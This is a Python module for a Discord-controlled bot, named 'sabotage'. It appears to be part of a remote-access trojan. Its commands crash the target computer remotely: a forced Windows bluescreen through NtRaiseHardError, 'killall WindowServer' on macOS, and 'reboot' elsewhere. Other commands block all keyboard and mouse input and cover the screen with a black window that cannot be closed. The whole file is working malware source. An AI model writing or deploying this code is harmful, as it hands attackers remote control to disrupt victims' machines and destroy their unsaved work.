"""
commands/sabotage.py - BSOD, input blocking, and blackscreen commands with macOS support.
"""

import os
import platform
import threading
import tkinter as tk

from discord.ext import commands
from pynput import keyboard, mouse

from config import IS_WINDOWS
from utils import (
    generic_command_error,
    in_correct_channel,
    is_authorized,
    log_message,
    send_temporary_message,
    wrong_channel,
)

# ── Input blocking state ───────────────────────────────────────────────────
_input_blocked = False
_keyboard_listener = None
_mouse_listener = None

# ── Blackscreen state ──────────────────────────────────────────────────────
_black_window = None

# ── BSOD state ─────────────────────────────────────────────────────────────
_confirmation_pending: dict = {}


# ── Input helpers ──────────────────────────────────────────────────────────
def _block_input():
    global _input_blocked, _keyboard_listener, _mouse_listener
    if not _input_blocked:
        _input_blocked = True
        # Note: On macOS, this requires Accessibility permissions for the terminal/app
        _keyboard_listener = keyboard.Listener(suppress=True)
        _mouse_listener = mouse.Listener(suppress=True)
        _keyboard_listener.start()
        _mouse_listener.start()
        print("Input blocked.")


def _unblock_input():
    global _input_blocked, _keyboard_listener, _mouse_listener
    if _input_blocked:
        _input_blocked = False
        if _keyboard_listener:
            _keyboard_listener.stop()
        if _mouse_listener:
            _mouse_listener.stop()
        print("Input unblocked.")


# ── Blackscreen helpers ────────────────────────────────────────────────────
def _blackscreen_on():
    global _black_window
    if _black_window is None:
        _black_window = tk.Tk()
        _black_window.attributes("-fullscreen", True)
        _black_window.configure(bg="black")
        _black_window.bind("<Escape>", lambda e: None)
        _black_window.protocol("WM_DELETE_WINDOW", lambda: None)
        _black_window.attributes("-topmost", True)
        _black_window.config(cursor="none")
        _black_window.mainloop()


def _blackscreen_off():
    global _black_window
    if _black_window is not None:
        _black_window.destroy()
        _black_window = None


# ── Cog ────────────────────────────────────────────────────────────────────
class SabotageCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # ── BSOD / Kernel Panic ───────────────────────────────────────────────
    @commands.command(name="bsod")
    @commands.check(is_authorized)
    async def bsod(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        
        system_type = "Bluescreen" if IS_WINDOWS else "Kernel Panic / Session Crash"
        _confirmation_pending[ctx.author.id] = True
        await ctx.send(
            f"⚠️ Warning: You are about to trigger a {system_type}! Type `!confirm_bsod` within 15 seconds to confirm."
        )
        import asyncio

        await asyncio.sleep(15)
        if _confirmation_pending.get(ctx.author.id):
            _confirmation_pending.pop(ctx.author.id, None)
            await ctx.send(
                "⏰ Confirmation timeout. Use `!bsod` to start the process again."
            )

    @commands.command(name="confirm_bsod")
    @commands.check(is_authorized)
    async def confirm_bsod(self, ctx):
        if _confirmation_pending.get(ctx.author.id):
            await ctx.send("Triggering system crash... 💀")
            
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.ntdll.RtlAdjustPrivilege(
                    19, 1, 0, ctypes.byref(ctypes.c_bool())
                )
                ctypes.windll.ntdll.NtRaiseHardError(
                    0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong())
                )
            elif platform.system() == "Darwin":
                # macOS sabotage: Forcefully kill the WindowServer to crash the GUI session
                # This effectively logs the user out and closes all applications instantly.
                os.system("killall WindowServer")
            else:
                # Fallback for other Unix systems
                os.system("reboot")
        else:
            await ctx.send(
                "No pending confirmation. Use `!bsod` to start the process."
            )
        _confirmation_pending.pop(ctx.author.id, None)

    @bsod.error
    async def bsod_error(self, ctx, error):
        await generic_command_error(ctx, error)

    @confirm_bsod.error
    async def confirm_bsod_error(self, ctx, error):
        await generic_command_error(ctx, error)

    # ── Input block ────────────────────────────────────────────────────────
    @commands.command(name="input")
    @commands.check(is_authorized)
    async def input_command(self, ctx, action: str):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        
        action = action.lower()
        if action == "block":
            if _input_blocked:
                msg = await ctx.send("❌ Input is already blocked.")
                await msg.delete(delay=5)
            else:
                _block_input()
                await ctx.send(
                    "🔒 Input has been blocked.\nTo unblock, use `!input unblock`."
                )
        elif action == "unblock":
            if not _input_blocked:
                msg = await ctx.send("❌ Input is already unblocked.")
                await msg.delete(delay=5)
            else:
                _unblock_input()
                await ctx.send("🔓 Input has been unblocked.")
        else:
            msg = await ctx.send(
                "❌ Invalid action. Use `!input block` or `!input unblock`."
            )
            await msg.delete(delay=5)

    @input_command.error
    async def input_error(self, ctx, error):
        await generic_command_error(ctx, error)

    # ── Blackscreen ────────────────────────────────────────────────────────
    @commands.command(name="blackscreen")
    @commands.check(is_authorized)
    async def blackscreen(self, ctx, action: str = None):
        if not in_correct_channel(ctx):
            await send_temporary_message(
                ctx,
                "This command can only be used in the specific channel for this PC.",
                duration=10,
            )
            return
        
        if action is None:
            await send_temporary_message(
                ctx,
                "❌ **Error:** No argument provided. Use `on` or `off`.",
                duration=10,
            )
            return

        action = action.lower()
        if action == "on":
            if _black_window is not None:
                await send_temporary_message(
                    ctx, "❌ **Error:** The black screen is already on.", duration=10
                )
            else:
                turning_on = await ctx.send("🖥️ **Turning on the black screen...**")
                threading.Thread(target=_blackscreen_on, daemon=True).start()
                await turning_on.delete()
                await ctx.send("✅ **Black screen is now on.**")
        elif action == "off":
            if _black_window is None:
                await send_temporary_message(
                    ctx, "❌ **Error:** The black screen is not on.", duration=10
                )
            else:
                turning_off = await ctx.send("🖥️ **Turning off the black screen...**")
                _blackscreen_off()
                await turning_off.delete()
                await ctx.send("✅ **Black screen is now off.**")
        else:
            await send_temporary_message(
                ctx, "❌ **Error:** Invalid argument. Use `on` or `off`.", duration=10
            )

    @blackscreen.error
    async def blackscreen_error(self, ctx, error):
        await generic_command_error(ctx, error)


async def setup(bot):
    await bot.add_cog(SabotageCommands(bot))
